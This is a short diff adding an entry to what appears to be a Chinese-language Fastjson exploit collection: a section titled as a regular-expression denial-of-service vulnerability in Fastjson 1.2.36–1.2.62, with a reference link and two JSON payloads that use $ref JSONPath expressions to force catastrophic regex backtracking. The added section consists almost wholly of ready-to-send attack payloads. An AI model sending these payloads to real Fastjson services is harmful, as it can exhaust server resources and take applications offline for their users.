@@ -480,6 +480,29 @@ poc:
     }
 }
 ```
+### Fastjson 1.2.36 - 1.2.62
+
+**正则表达式拒绝服务漏洞**
+
+https://b1ue.cn/archives/314.html
+
+
+```json
+{
+    "regex":{
+        "$ref":"$[\blue = /\^[a-zA-Z]+(([a-zA-Z ])?[a-zA-Z]*)*$/]"
+    },
+    "blue":"aaaaaaaaaaaaaaaaaaaaaaaaaaaa!"
+}
+```
+```json
+{
+    "regex":{
+        "$ref":"$[blue rlike '^[a-zA-Z]+(([a-zA-Z ])?[a-zA-Z]*)*$']"
+    },
+    "blue":"aaaaaaaaaaaaaaaaaaaaaaaaaaaa!"
+}
+```
 
 
 **1.2.48之后版本，比较困难**
